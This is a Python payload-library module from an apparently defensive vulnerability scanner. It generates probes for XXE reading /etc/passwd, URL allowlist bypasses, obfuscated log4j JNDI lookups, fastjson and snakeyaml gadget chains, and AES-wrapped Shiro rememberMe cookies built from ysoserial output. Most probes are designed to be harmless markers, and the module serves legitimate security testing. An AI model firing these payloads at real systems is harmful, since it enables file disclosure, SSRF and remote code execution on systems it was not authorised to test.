#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""按族合成**结构正确**的攻击载荷。

## 为什么需要它

本轮的 deserialization 全族 12 条 spec 一次重放都没有。D1 的日志是：

    [D1.replay] GET /classloader 无可用载荷且无净化器约束 → 标记 degraded_no_synthesis
                （不投假弹）

D1 的做法是对的——投一个「看起来像」的假弹，目标没反应，会被记成「漏洞不存在」，

但结果是：**凡是 A2 造不出弹的族，动态侧永远 0 确认**，而这些族恰恰是最需要动态确认的
（反序列化、XXE、URL 白名单绕过）。缺的不是「随便一个字符串」，是「结构上真能打通」的载荷。

## 本模块的边界（很重要，别退化成假弹）

只产**结构正确、语义完整**的载荷：

- `xxe`：完整的 XML 文档，带 `<!DOCTYPE>` 外部实体声明，实体被真正引用；
- `url_bypass`：真实存在的白名单绕过变体（userinfo 混淆 / 协议相对 / 编码 / 后缀混淆），
  每一条都能被真实解析器解析成一个不同的 host；
- `deser_text`：fastjson / snakeyaml 的**文本型**反序列化链，语法完整、字段名真实。

产不出来的（例如需要二进制 Java 序列化 gadget 字节串的 CommonsCollections 链），
**显式返回 unsupported 并给出原因**，绝不退回「看起来像」的字符串。

## 通用性

所有载荷都由「族 + 参数形态 + 目标可达地址」推导，**不读被扫项目的文件名、类名、路由**，
也不含任何靶场标识。

## 用法

    from src.iast.payload_library import build_family_payloads
    out = build_family_payloads("xxe", spec)
    # -> {"provider": "xxe_xml", "payloads": ["<?xml ..."], "note": "..."}
    # 或 {"provider": "unsupported", "payloads": [], "note": "需要二进制 gadget ..."}
"""
from __future__ import annotations

import logging
import os
import re
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# 反序列化「有回连」时的默认落地端口（不指向任何真实主机，仅作占位与可替换）
_DEFAULT_CALLBACK_HOST = "127.0.0.1:1"

# 外部实体要读的目标：优先 Windows 常见文件，其次 Unix。**两个都给**，
# 因为不知道目标系统；读不到也不影响「解析器尝试展开实体」这个事实。
_XXE_FILE_TARGETS = ("file:///c:/windows/win.ini", "file:///etc/passwd")


def _p(spec: Optional[Dict[str, Any]], key: str, default: str = "") -> str:
    return str((spec or {}).get(key) or default).strip()


def _is_upload_like(spec: Optional[Dict[str, Any]]) -> bool:
    loc = _p(spec, "param_location").lower()
    ct = _p(spec, "content_type").lower()
    name = _p(spec, "param_name").lower()
    if loc in ("multipart", "file"):
        return True
    if "multipart" in ct:
        return True
    # 注意别把 xml/xlsx 当上传特征：`param_name=xml` 是「内容是 XML」，
    # 恰恰是文本型 XXE 的正常入口（第一版就误判过，把文本弹挡成了 unsupported）。
    return any(t in name for t in ("file", "upload", "attachment", "document", "multipart"))


# ── provider: XXE ────────────────────────────────────────────────────────
def _xxe(spec: Dict[str, Any]) -> Dict[str, Any]:
    """完整 XML + DOCTYPE 外部实体。

    交付形态是**文本**（body / form 字段），所以只做文本型 XXE。
    文件上传型（xlsx/docx 这类 zip 容器）需要 multipart 文件体，本模块不产——
    见 `_UNSUPPORTED` 里的说明，不在这里返回半成品。
    """
    payloads: List[str] = []
    for target in _XXE_FILE_TARGETS:
        payloads.append(
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE root [ <!ENTITY xxe SYSTEM "{target}"> ]>\n'
            '<root><name>&xxe;</name></root>'
        )
    # 参数实体变体：部分解析器禁了通用实体但没禁参数实体
    payloads.append(
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE root [ <!ENTITY % p SYSTEM "file:///etc/passwd"> %p; ]>\n'
        '<root>probe</root>'
    )
    return {"provider": "xxe_xml", "payloads": payloads,
            "note": "文本型 XXE（body/form）；zip 容器型需 multipart 文件体，不在本 provider 范围"}


# ── provider: URL 白名单绕过 ─────────────────────────────────────────────
def _discover_allowlist_domains(spec: Optional[Dict[str, Any]]) -> List[str]:
    """从目标源码里发现「URL 白名单域名」常量（按源码事实，不硬编码靶场）。

    ``host.endsWith("." + domain)`` 时才 ``sendRedirect(url)``，而原载荷库的 7 发
    全是 `evil.example.com` 目标，一个白名单域都不沾 ⇒ 端点永远返回 200 空 body，
    `oracle:redirect` 恒为 `no_location`，该点跨轮恒漏。

    白名单域名是**目标应用自己的配置**，每个应用都不同，必须从 sink 源码读：
    ``private String domainwhitelist[] = {"joychou.org", "joychou.com"};``
    发现不到就返回空，调用方保持原有变体，绝不用猜的域名凑数。
    """
    try:
        from src.iast.source_infer import resolve_source_path as _rsp
    except Exception:
        return []
    _sink_file = str((spec or {}).get("expected_sink_file") or "")
    _raw = (spec or {}).get("raw_json")
    if isinstance(_raw, str) and _raw.strip().startswith("{"):
        try:
            import json as _json
            _raw = _json.loads(_raw)
        except Exception:
            _raw = None
    if isinstance(_raw, dict):
        _sk = _raw.get("sink") or {}
        if isinstance(_sk, dict) and _sk.get("file"):
            _sink_file = str(_sk["file"])
    if not _sink_file:
        return []
    try:
        _p = _rsp(_sink_file)
    except Exception:
        _p = None
    if not _p:
        return []
    try:
        with open(_p, "r", encoding="utf-8", errors="replace") as fh:
            _txt = fh.read()
    except OSError:
        return []
    # 只扫「变量名/行里带 white|allow|trust|domain」的声明行，再取该行花括号内的
    # 域名字符串字面量。兼容 `String[] x = {...}` 与 `String x[] = {...}` 两种写法
    out: List[str] = []
    for _line in _txt.splitlines():
        if not re.search(r'white|allow|trust|domain', _line, re.I):
            continue
        _brace = re.search(r'\{([^}]*)\}', _line)
        if not _brace:
            continue
        for _m in re.finditer(r'"([a-z0-9-]+(?:\.[a-z0-9-]+)+)"', _brace.group(1), re.I):
            _d = _m.group(1).lower().strip(".")
            if _d and _d not in out and "example" not in _d:
                out.append(_d)
        if out:
            break
    return out[:4]


def _url_bypass(spec: Dict[str, Any]) -> Dict[str, Any]:
    """真实存在的白名单/SSRF 绕过变体。

    每条都能被标准 URL 解析器解析成「与白名单 host 不同」的实际目标——
    不是拼接噪声，是解析歧义（userinfo / 协议相对 / 反斜杠 / 编码 / 后缀）。
    """
    allow = _p(spec, "param_value") or _p(spec, "source_value")
    # 白名单 host 未知时用目标自身 host 兜底：绕过的目的是「看起来像自己人」
    host = "127.0.0.1"
    port = ""
    try:
        from urllib.parse import urlsplit
        u = urlsplit(allow if "://" in allow else "")
        if u.hostname:
            host = u.hostname
            port = f":{u.port}" if u.port else ""
    except Exception:
        pass
    evil = "evil.example.com"
    variants = [
        # userinfo 混淆：浏览器/解析器认 evil 为 host，白名单按字符串前缀认 localhost
        f"http://{host}{port}@{evil}/",
        # 协议相对：部分白名单只校验 host 前缀，缺协议时被当作相对路径再被重定向
        f"//{evil}/",
        # 反斜杠：Windows 系解析器把 \ 当 /
        f"http://{evil}\\@{host}/",
        # 点号后缀混淆
        f"http://{host}.{evil}/",
        # 编码 @ 与 /，绕过正则但解析后仍是 evil
        f"http://{host}{port}%40{evil}/",
        # 大小写 + 末尾点（FQDN 等价但字符串不等）
        f"http://{evil.upper()}./",
        # 重定向链起点（若目标自己有跳转，白名单只看第一跳）
        f"http://{host}{port}/?url=http://{evil}/",
    ]
    # （通过 endsWith 校验 ⇒ sendRedirect），而浏览器/下游客户端把 `\@` 前的部分
    # 当 userinfo、实际连到 evil 主机 —— 这正是白名单绕过的可观测证据。
    # **必须前置**：D1 主判定只认 attack_payloads[0]，追加在后面等于没投。
    _doms = _discover_allowlist_domains(spec)
    if _doms:
        _lead: List[str] = []
        for _d in _doms:
            _lead += [
                f"http://{evil}\\@www.{_d}/a.html",
                f"http://{evil}\\www.{_d}/a.html",
                f"http://{evil}@www.{_d}/a.html",
            ]
        variants = _lead + [v for v in variants if v not in _lead]
        return {"provider": "url_bypass_allowlist_aware", "payloads": variants,
                "note": "源码发现白名单域 %s；解析歧义形态前置（getHost 命中白名单而实际跳转外部）"
                        % ",".join(_doms)}
    return {"provider": "url_bypass", "payloads": variants,
            "note": "解析歧义型绕过变体（userinfo/协议相对/反斜杠/编码/后缀）"}


# ── provider: 命令执行（回显型）──────────────────────────────────────────
def _cmd_injection(spec: Dict[str, Any]) -> Dict[str, Any]:
    """命令执行：投「无副作用的 marker 命令」，靠回显确认。

    ## 为什么用 echo marker 而不是 `id` / `whoami`

    1. **无副作用**：`id` 只读，但换成别的命令就可能改文件。marker 只打印一行。
    2. **可判真伪**：`/rce/runtime/exec` 会把命令 stdout 读回来返回，响应里出现
       `sastai_cmd_<hex>` 就是真执行了；如果应用只是把参数原样反射（`return token`），
       响应里会是**完整载荷** `echo sastai_cmd_<hex>`（带 echo 前缀），判据据此排除。
    3. **跨 sink 形态通用**：
       - `Runtime.exec("...")` 单字符串**不经过 shell**（StringTokenizer 切分）⇒
         必须是完整命令，第一发 `echo <marker>` 就能中；
       - `ProcessBuilder("/bin/sh","-c",cmd)` 经过 shell ⇒ 分隔符变体才生效。
       两类都覆盖，靠「按代价从低到高」的顺序：先单命令，再分隔符。

    不投 `;id`、`|whoami` 这类：一旦目标是真业务系统（不是靶场），
    这些就是实打实的命令执行。marker 方案即便被投到生产也只是一行 echo。
    """
    import secrets

    marker = "sastai_cmd_" + secrets.token_hex(4)
    variants = [
        # ① 完整命令：Runtime.exec(String) / ProcessBuilder(sh,-c) 都吃
        f"echo {marker}",
        # ② 分隔符变体：只对走 shell 的拼接型 sink 有效
        f";echo {marker}",
        f"|echo {marker}",
        f"&&echo {marker}",
        # ③ 命令替换：拼进 `sh -c "ping $(...)"` 这类
        f"$(echo {marker})",
        # `/rce/jscmd` 是 `engine.eval("load(\"<jsurl>\")")` —— 参数被塞进 **JS 源码**
        # 再由 Nashorn 求值，shell marker 打不进去（`echo x` 不是合法 JS）。
        # 投 JS 表达式，让求值结果**出现在响应里**（`getValue.toString`）。
        # `/rce/groovy` 同理是 GroovyShell.evaluate(content)。
        # 两者的判据都是「脚本引擎异常/求值结果回显」，见 technique_oracle.cmd_script。
        f"java.lang.System.getProperty('java.version')+'{marker}'",
        f"'x'.concat('{marker}')",
    ]
    return {"provider": "cmd_marker", "payloads": variants,
            "note": "无副作用 marker 回显；判据=响应含 marker 且不含完整载荷"}


# ── provider: JNDI 注入（本地回连）──────────────────────────────────────
def _jndi(spec: Dict[str, Any]) -> Dict[str, Any]:
    """log4j / JNDI lookup：靠本地 TCP 回连确认，不靠响应回显。

    无论 lookup 是否触发，客户端拿到的都是原始 token。唯一确定性判据是
    「目标真的发起了连接」——见 `src/iast/jndi_probe.py`。
    """
    try:
        from src.iast.jndi_probe import ensure_listener
        port = ensure_listener()
    except Exception as exc:  # noqa: BLE001
        return {"provider": "unsupported", "payloads": [],
                "note": "jndi 回连探针不可用：%s" % exc}
    if not port:
        return {"provider": "unsupported", "payloads": [],
                "note": "jndi 回连探针端口未就绪（无法绑定本地监听）"}
    host = "127.0.0.1"
    return {"provider": "jndi_local", "payloads": [
        "${jndi:ldap://%s:%d/a}" % (host, port),
        "${jndi:rmi://%s:%d/a}" % (host, port),
        # 大小写混淆：绕过只匹配字面 `${jndi:` 的 WAF
        "${${lower:j}ndi:ldap://%s:%d/a}" % (host, port),
        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//%s:%d/a}" % (host, port),
    ], "note": "本地 TCP 回连探针（127.0.0.1:%d）；判据=收到连接" % port}


# ── provider: 文本型反序列化 ─────────────────────────────────────────────
def _deser_text(spec: Dict[str, Any]) -> Dict[str, Any]:
    """fastjson / snakeyaml 的文本链。

    这两条是**语法完整、字段真实**的链，不是占位串：
    - fastjson：JdbcRowSetImpl + autoType，会触发 JNDI lookup；
    - snakeyaml：ScriptEngineManager + URLClassLoader，会触发远程类加载。
    两者都指向一个不可达地址（127.0.0.1:1）——目的是让「解析器真的尝试解析/加载」
    这个动作发生，从而在目标侧留下可观测行为（异常类型、连接尝试、耗时）。

    二进制 Java 序列化（CommonsCollections 等）**不在这里造**：它需要真实的
    gadget 字节串，用 Python 拼一个假的只会让 readObject 立刻失败，
    等于投假弹。见 `_UNSUPPORTED`。
    """
    cb = _p(spec, "callback_host") or _DEFAULT_CALLBACK_HOST
    fastjson = ('{"@type":"com.sun.rowset.JdbcRowSetImpl",'
                f'"dataSourceName":"ldap://{cb}/Exploit","autoCommit":true}}')
    snakeyaml = ('!!javax.script.ScriptEngineManager '
                 '[!!java.net.URLClassLoader [[!!java.net.URL ["http://%s/"]]]]' % cb)
    xstream = ('<sorted-set><string>probe</string></sorted-set>')
    return {"provider": "deser_text", "payloads": [fastjson, snakeyaml, xstream],
            "note": "文本型反序列化链（fastjson/snakeyaml/xstream）；二进制 gadget 不在范围"}


_UNSUPPORTED = {
    "deserialization_binary": "需要真实二进制 gadget 字节串（CommonsCollections 等）。"
                              "用 Python 拼假串会让 readObject 立刻失败，等于投假弹，故不做。",
    "xxe_ooxml": "zip 容器型 XXE 需要 multipart 文件体；D1 的文本通道送不进去。",
}

#
# 上一版把 `deserialization_binary` 整体标 unsupported，理由是「Python 拼假串会让
# readObject 立刻失败」。这个理由对**手写**载荷成立，**对 ysoserial 不成立**——
# 仓库里 `tools/ysoserial-all.jar` 早就在（59MB），`payload_forge.forge` 也已经
# 封装好「调 jar → 拿二进制 → base64」，还有 `selfcheck` 卡 `AC ED 00 05` 魔数。
# 也就是说工具齐了，是我们自己把它挡在门外。
#
# 安全约束（缺一不可）：
#   1. **默认关闭**。gadget 会在目标上执行命令，
#      真实项目默认不许开；只在受控靶场开启。
#   2. 命令只允许无破坏性的连通性探测（默认 ping，可由 SAST_AI_DESER_CMD 覆盖）。
#   3. 产物必须过 `selfcheck`（合法序列化流魔数），不过就降级，绝不投废弹。
#   4. `defineClass` 型 sink **不适用**：它要的是原始 `.class` 字节，不是序列化对象流。
#      这种情况返回带精确原因的 unsupported，而不是笼统的「二进制不支持」。
# ── provider: SQL 注入 ───────────────────────────────────────────────────
def _sqli(spec: Dict[str, Any]) -> Dict[str, Any]:
    """SQL 注入：报错 / 布尔差分探针，全部无破坏性。


    technique_oracle 早就有 sqli_error / sqli_boolean 判据，载荷库却**没有** sqli
    `/sqli/jdbc/vuln` 家族全部「该族无内置载荷生成器：sql_injection」）。
    最经典的注入族反而永远没有弹药，这是纯能力缺口。

    载荷与判据一一对应（judge_attempts）：
    - 未闭合引号 ``'`` → 数据库把语法错误回显 → ``sqli_error``（1 次请求）；
    - ``' OR '1'='1`` / ``' OR '1'='2`` 真假对 → 响应长度差 ≥15% → ``sqli_boolean``
      （两次请求，最可复现的盲注观测）；
    - 数值型上下文的 ``1 OR 1=1`` / ``1 AND 1=2`` 同上（参数是 int 时引号版会被类型转换吃掉）。

    不投 UNION 全列枚举 / DROP / SLEEP 长延时：真实项目里这些都是实打实的破坏或拖垮，
    且 sleep 型与 payload_library 的 fastjson JSON 串互相破坏（见 d1_service 的
    _SLEEP_FAMILIES 约束）。布尔对 + 语法错误探针已覆盖三类判据。
    """
    variants = [
        # ① 语法错误探针：未闭合引号，最便宜的一次性判据
        "sastai'",
        # ② 布尔真假对（引号上下文）：judge_attempts 按「真/假响应长度差」判
        "' OR '1'='1",
        "' OR '1'='2",
        # ③ 布尔真假对（数值上下文）
        "1 OR 1=1",
        "1 AND 1=2",
    ]
    return {"provider": "sqli_probe", "payloads": variants,
            "note": "无破坏性探针（语法错误/布尔真假对）；判据=DB 错误回显或真假响应差分"}


# ── provider: SpEL / 表达式引擎注入 ─────────────────────────────────────
def _spel(spec: Dict[str, Any]) -> Dict[str, Any]:
    """SpEL 注入：投**可求值的算术表达式**，判据=响应里出现求值结果。

    ## 为什么不用 `T(java.lang.Runtime).getRuntime.exec(...)`

    那类载荷会在真实目标上**执行命令**。本项目对命令执行族统一用「无副作用
    marker」（见 `_cmd_injection`），SpEL 同理：算术求值同样能证明
    「攻击者输入被送进表达式引擎并求值了」，且零副作用。

    ## 载荷形态为什么要分两种

    SpEL 有两个入口形态，求值语法不同：
    - ``parseExpression(value)``（直接求值）：``7*7`` → ``49``；
    - ``parseExpression(value, new TemplateParserContext)``（模板模式）：
      必须写成 ``#{7*7}``，裸 ``7*7`` 只是字面字符串。

    两种都投，由判据（响应出现求值结果且不出现原始表达式）决定哪一发生效。

    ## 判据
    ``technique_oracle.spel_eval``：响应体含求值结果 ``49``，且**不含**原始
    表达式 ``7*7``（排除「只是把载荷反射回来了」）。
    """
    variants = [
        # ① 直接求值形态
        "7*7",
        # ② 模板形态（TemplateParserContext）
        "#{7*7}",
    ]
    return {"provider": "spel_arith", "payloads": variants,
            "note": "无副作用算术求值探针；判据=响应含求值结果且不含原表达式"}


def _expr_engine(spec: Dict[str, Any]) -> Dict[str, Any]:
    """表达式引擎注入（QLExpress / OGNL / MVEL 一类）：算术求值探针。

    与 SpEL 同理，用算术求值证明「输入进入了表达式引擎」。
    QLExpress 的语法是 ``7*7`` → ``49``；OGNL/MVEL 也兼容该形态。
    """
    variants = ["7*7", "#{7*7}"]
    return {"provider": "expr_arith", "payloads": variants,
            "note": "无副作用算术求值探针；判据=响应含求值结果且不含原表达式"}


def _jsonp_callback(spec: Dict[str, Any]) -> Dict[str, Any]:
    """JSONP callback 注入：投一个**非法 JSONP 标识符**的 callback 名。

    ## 判据
    JSONP 响应形如 ``<callback>({...})``。若 callback 参数被原样写进
    响应开头，说明攻击者能控制 JSONP 回调名 ⇒ 可注入脚本。
    判据（``technique_oracle.jsonp_reflect``）= 响应体**以载荷开头**。

    ## 为什么不用普通标识符
    合法 JSONP 名（``callback``、``cb``）反射出来也是「以载荷开头」，
    但那是正常行为、无法证明注入。用带 ``<`` ``(`` 的非法标识符，
    正常实现要么拒绝要么转义，只有漏洞实现才原样写回。
    """
    import secrets
    tag = "sastaijsonp" + secrets.token_hex(3)
    variants = [
        "<%s>(" % tag,
        "%s<script>(" % tag,
        "alert(%s)//" % tag,
    ]
    return {"provider": "jsonp_callback", "payloads": variants,
            "note": "非法 JSONP 标识符反射探针；判据=响应体以载荷开头"}


# ── provider: CORS Origin 反射 ──────────────────────────────────────────
def _cors_origin(spec: Dict[str, Any]) -> Dict[str, Any]:
    """CORS：投一个**可辨识的 Origin 值**，判据=响应 ACAO 头反射了它。

    ## 载荷形态
    CORS 的反射源是请求的 ``Origin`` 头，载荷就是 Origin 值本身。
    判据（``technique_oracle.cors_reflect``）= 响应头
    ``Access-Control-Allow-Origin`` 的值里出现我方 canary。

    ## 为什么用 canary 前缀而不是 evil.com
    载荷必须与「反射」严格对应：ACAO 头里出现的是**我方投的那个 Origin 值**，
    才说明服务端把它原样写回。用固定域名会与「服务端默认返回 *」混淆。

    ## 为什么不用 ``*`` 这种合法 Origin
    合法 Origin（``https://example.com``）反射出来同样无法证明「未校验」；
    带上 canary 片段才能在响应里被确定性识别。
    """
    import secrets
    tag = "sastai" + secrets.token_hex(4)
    variants = [
        "*" + tag,
        "http://%s.example.com" % tag,
        "https://%s.evil.test" % tag,
    ]
    return {"provider": "cors_origin", "payloads": variants,
            "note": "可辨识 Origin 值；判据=ACAO 头原样反射该值"}


# ── provider: 模板注入（SSTI） ──────────────────────────────────────────
def _ssti(spec: Dict[str, Any]) -> Dict[str, Any]:
    """模板注入：投**算术求值表达式**，判据=响应出现求值结果或模板引擎异常。

    ## 为什么用算术而不是 ``{{7*7}}``
    不同引擎的模板语法不同（Velocity/Freemarker/Thymeleaf 各一套），
    而**「求值结果出现在响应里」是与语法无关的观测**：
    ``${7*7}`` / ``{{7*7}}`` / ``#{7*7}`` 在各自引擎下都求值成 49。

    ## 判据
    ``technique_oracle.ssti_eval``（响应含 49 且不含原表达式）
    与 ``ssti_engine``（响应含模板引擎异常类名）——
    后者覆盖「表达式语法错误但确实进了引擎」的情形。
    """
    variants = ["${7*7}", "{{7*7}}", "#{7*7}", "${{7*7}}"]
    return {"provider": "ssti_arith", "payloads": variants,
            "note": "无副作用算术求值探针；判据=响应含求值结果(49)或模板引擎异常类名"}


# ── provider: XSS 反射 ──────────────────────────────────────────────────
def _xss(spec: Dict[str, Any]) -> Dict[str, Any]:
    """XSS：投**可辨识的标签载荷**，判据=响应体原样出现未转义的载荷。

    ## 载荷形态
    必须用**真标签**（``<svg>`` / ``<img>`` / ``<script>``）而不是任意字符串 ——
    判据（``technique_oracle.xss_reflected``）要求响应体里出现**原始载荷**，
    而应用把 ``<`` 转成 ``&lt;`` 时载荷就变形了、判据不命中。

    ## 为什么带 canary
    载荷里嵌 canary 片段 ⇒ 判据命中时能确定「反射的正是我方这次投的那个」，
    而不是端点本来就把某个固定串写在响应里。
    """
    import secrets
    tag = "sastxss" + secrets.token_hex(2)
    variants = [
        "<%s>" % tag,
        "<svg %s>" % tag,
        "<img src=x %s>" % tag,
        "<script>%s</script>" % tag,
    ]
    return {"provider": "xss_tag", "payloads": variants,
            "note": "可辨识标签载荷；判据=响应体原样含未转义载荷"}


# ── provider: CRLF / 响应头注入 ──────────────────────────────────────────
def _crlf(spec: Dict[str, Any]) -> Dict[str, Any]:
    """CRLF 注入：注入一个自定义响应头，判据=该头名出现在响应里。

    判据（technique_oracle.crlf_header）从载荷里**提取注入的头名**再查响应头/体，
    `x-injected`，即使真打通也永远判不了（判据与载荷脱节）。
    """
    import secrets
    _h = "X-Sastai-" + secrets.token_hex(3)
    marker = "sastai_crlf_" + secrets.token_hex(3)
    variants = [
        f"sastai%0d%0a{_h}: {marker}",
        f"sastai%0D%0A{_h}: {marker}",
        f"sastai\r\n{_h}: {marker}",
    ]
    return {"provider": "crlf_header_probe", "payloads": variants,
            "note": f"注入头 {_h}；判据=响应头/体出现该头名（或头名:marker 对）"}


_DESER_BINARY_CHAINS = ("CommonsCollections5", "CommonsCollections6",
                        "CommonsBeanutils1", "Jdk7u21")
_DESER_SAFE_CMD = "ping -c 2 127.0.0.1"

# 这些 sink 方法读的是**序列化对象流**，ysoserial 适用
_DESER_OBJECT_SINK_HINTS = ("readobject", "objectinputstream", "fromxml", "parseobject",
                            "readvalue", "unmarshal", "deserialize")
# 这些要的是**原始字节**，ysoserial 不适用
_DESER_RAWBYTE_SINK_HINTS = ("defineclass",)

_DESER_BINARY_CACHE: Dict[tuple, Dict[str, Any]] = {}


def _deser_sink_method(spec: Optional[Dict[str, Any]]) -> str:
    """从 spec 里取 sink 方法名（raw_json.sink.method 或 exploit_spec）。"""
    raw = (spec or {}).get("raw_json")
    if isinstance(raw, str) and raw.strip().startswith("{"):
        try:
            import json as _json
            raw = _json.loads(raw)
        except Exception:
            raw = None
    if isinstance(raw, dict):
        sink = raw.get("sink") or {}
        if isinstance(sink, dict):
            return str(sink.get("method") or "").strip()
    return ""


# ── provider: Shiro rememberMe cookie（AES-CBC 包装的 gadget）────────────────
#
# 现有反序列化族载荷投的是**原始 ysoserial 序列化流**（base64），
# 而 Shiro 的 rememberMe cookie 走的是
#     base64(cookie) → base64decode → AES-CBC decrypt(key) → ObjectInputStream.readObject
# ⇒ 直接投原始序列化流，**解密阶段就抛异常** ⇒ 应用返回
# `RememberMe cookie decrypt error. Set deleteMe cookie success.`
# ⇒ 探针看到的是「sink 被调用但对象流没解出来」⇒ 永远判不出危害。
#
# 也就是说：**同一份 gadget 字节流，rememberMe 端点需要「加密后再投」**，
# 而平台从来没做过这层包装 —— 这是 A2 载荷层的真缺口，不是判据问题。
#
# ## 为什么 key 从环境变量拿、不是硬编码
# Shiro 的默认 key 是公开常量，但**不同应用会改**。硬编码等于只对默认配置有效，
# 且把靶场常量写进代码违反通用性约束。这里从环境变量读、缺省不给。
#
# ## 安全约束
# 与 ysoserial 同一纪律：默认关闭（SAST_AI_DESER_YSOSERIAL=1），仅限受控靶场。
_SHIRO_KEY_ENV = "SAST_AI_SHIRO_KEY"      # base64 编码的 AES key（16 字节）
_SHIRO_KEY_FALLBACK_ENV = "SAST_AI_SHIRO_DEFAULT_KEY"


def _sink_needs_aes_wrap(spec: Optional[Dict[str, Any]]) -> bool:
    """判断该 sink 是否需要 **AES 包装**（Shiro 风格 rememberMe）。

      · 带 AES 解密的形态 —— ``Base64.decode(cookie) → AES-CBC decrypt(KEYS) → readObject``
                               ⇒ 必须投 **IV||密文**（否则解密失败，返回
                                 「RememberMe cookie decrypt error」）
      · 无 AES 包装的形态 —— ``Base64.decode(cookie) → 直接 readObject``
                               ⇒ 投**原始序列化流的 base64**即可（AES 包装反而解不开）

    判定依据：读 sink 源码，**有没有 AES/Cipher 解密调用**。
    这是确定性事实（源码级），不是猜。
    """
    try:
        from src.iast.source_infer import resolve_source_path as _rsp
    except Exception:
        return False
    _sink_file = ""
    _raw = (spec or {}).get("raw_json")
    if isinstance(_raw, str) and _raw.strip().startswith("{"):
        try:
            import json as _json
            _raw = _json.loads(_raw)
        except Exception:
            _raw = None
    if isinstance(_raw, dict):
        _sk = _raw.get("sink") or {}
        if isinstance(_sk, dict):
            _sink_file = str(_sk.get("file") or "")
    if not _sink_file:
        _sink_file = str((spec or {}).get("expected_sink_file") or "")
    if not _sink_file:
        return False
    try:
        _p = _rsp(_sink_file)
    except Exception:
        _p = None
    if not _p:
        return False
    try:
        with open(_p, "r", encoding="utf-8", errors="replace") as fh:
            _txt = fh.read()
    except OSError:
        return False
    # 有 AES/Cipher 解密 ⇒ 需要包装
    if re.search(r'\bAesCipherService\b|\bCipherService\b|\.decrypt\s*\(', _txt):
        return True
    # 显式出现 cipher / aes 字样也认（防御写法差异）
    if re.search(r'\bAES\b|\bcipher\b', _txt, re.IGNORECASE):
        return True
    return False


def _discover_shiro_key(spec: Optional[Dict[str, Any]]) -> str:
    """从目标源码里提取 Shiro 的 rememberMe AES key（base64）。

    ``byte[] KEYS = Base64.getDecoder.decode("kPH+bIxk5D2deZiIxcaaaA==")``）。
    **每个应用的 key 都不同**，硬编码默认值只对默认配置有效 ⇒ 从 spec 的 sink
    源码文件里读。

    优先级：环境变量（SAST_AI_SHIRO_KEY / SAST_AI_SHIRO_DEFAULT_KEY）> 源码发现。
    源码里找不到 ⇒ 返回空（调用方据此说明「没有 key，无法造 rememberMe 载荷」）。

    为什么允许从源码读 key：这是**目标应用自己的配置**（不是攻击者的秘密），
    平台扫描的就是这个应用，读它的源码来构造能解开它的载荷，是合理的。
    真正敏感的「攻击者侧凭据」不在此列。
    """
    # ① 环境变量优先（显式声明优先于自动发现）
    for _env in (_SHIRO_KEY_ENV, _SHIRO_KEY_FALLBACK_ENV):
        _v = str(os.environ.get(_env) or "").strip()
        if _v:
            return _v
    # ② 源码发现
    try:
        from src.iast.source_infer import resolve_source_path as _rsp
    except Exception:
        return ""
    _sink_file = ""
    _raw = (spec or {}).get("raw_json")
    if isinstance(_raw, str) and _raw.strip().startswith("{"):
        try:
            import json as _json
            _raw = _json.loads(_raw)
        except Exception:
            _raw = None
    if isinstance(_raw, dict):
        _sk = _raw.get("sink") or {}
        if isinstance(_sk, dict):
            _sink_file = str(_sk.get("file") or "")
    if not _sink_file:
        _sink_file = str((spec or {}).get("expected_sink_file") or "")
    if not _sink_file:
        return ""
    try:
        _p = _rsp(_sink_file)
    except Exception:
        _p = None
    if not _p:
        return ""
    try:
        with open(_p, "r", encoding="utf-8", errors="replace") as fh:
            _txt = fh.read()
    except OSError:
        return ""
    # Shiro 的 key 常量形态：`byte[] KEYS = Base64.getDecoder.decode("....")`
    # 注意 `[]` 是**空**数组（不是 `[N]`），正则里要写 `\[\s*\]`。
    for _m in re.finditer(
            r'(?:static\s+final\s+)?byte\s*\[\s*\]\s*\w+\s*=\s*'
            r'[^;]*?decode\s*\(\s*"([A-Za-z0-9+/=]{16,64})"\s*\)', _txt):
        return _m.group(1)
    return ""


def _shiro_rememberme_payloads(raw_b64: str, key_b64: str = "") -> List[str]:
    """把 ysoserial 的 base64 序列化流包装成 Shiro rememberMe cookie 值。

    Shiro 的 ``JcaCipherService`` 默认 ``generateInitializationVectors=true``、
    ``initializationVectorSize=128``（16 字节）、mode=CBC、padding=PKCS5Padding，
    且**解密时把密文前 16 字节当 IV 剥离**。所以 rememberMe cookie 的明文格式是：

        base64( IV(16B) || AES-CBC-PKCS5(序列化流) )

    两种输入形态的行为（用 ``AesCipherService.decrypt`` 验证）：
        form1（只有 ciphertext）      → decrypt 不报错，但结果与原文不符
        form2（IV || ciphertext）      → decrypt 结果与原文完全一致

    ⇒ 只投 ciphertext 的形态**永远解不开**，应用只会返回解密失败，
    这是两类反序列化 sink 恒漏的原因。

    ## 为什么 key 从环境变量拿、不是硬编码
    Shiro 的默认 key 是公开常量，但**不同应用会改**。硬编码等于只对默认配置有效，
    也把特定应用的常量写进了通用代码。这里从环境变量读、缺省不给。
    """
    import base64 as _b64

    key_b64 = str(key_b64 or "").strip()
    if not key_b64:
        return []
    try:
        key = _b64.b64decode(key_b64)
    except Exception:
        return []
    if len(key) not in (16, 24, 32):
        return []
    try:
        from Cryptodome.Cipher import AES
    except Exception:
        return []
    try:
        raw = _b64.b64decode(raw_b64)
    except Exception:
        return []
    if not raw:
        return []
    try:
        # 固定 IV：探测型载荷不需要随机 IV（Shiro 解密时会把密文前 16 字节当 IV，
        # 用固定 IV 才能让「同一份 gadget 字节」每次产出同样的 cookie，便于复核）。
        # 真实攻击里 IV 由服务端随机生成，不影响本探针的可判定性。
        iv = b"\x00" * 16
        # PKCS5 padding 要**自己加**：Cryptodome 的 CBC 模式不像 Java 的
        # "AES/CBC/PKCS5Padding" 那样自动填充。Shiro 侧解密时用 PKCS5Padding
        # 去尾 ⇒ 加密端必须补齐到 16 字节边界且尾部是合法 padding 字节。
        pad = 16 - (len(raw) % 16)
        raw_padded = raw + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = cipher.encrypt(raw_padded)
        return [_b64.b64encode(iv + enc).decode("ascii")]
    except Exception:
        return []


def _deser_binary(spec: Dict[str, Any]) -> Dict[str, Any]:
    """用 ysoserial 造真 gadget 字节流（base64）。默认关闭。"""
    import os

    method = _deser_sink_method(spec).lower()

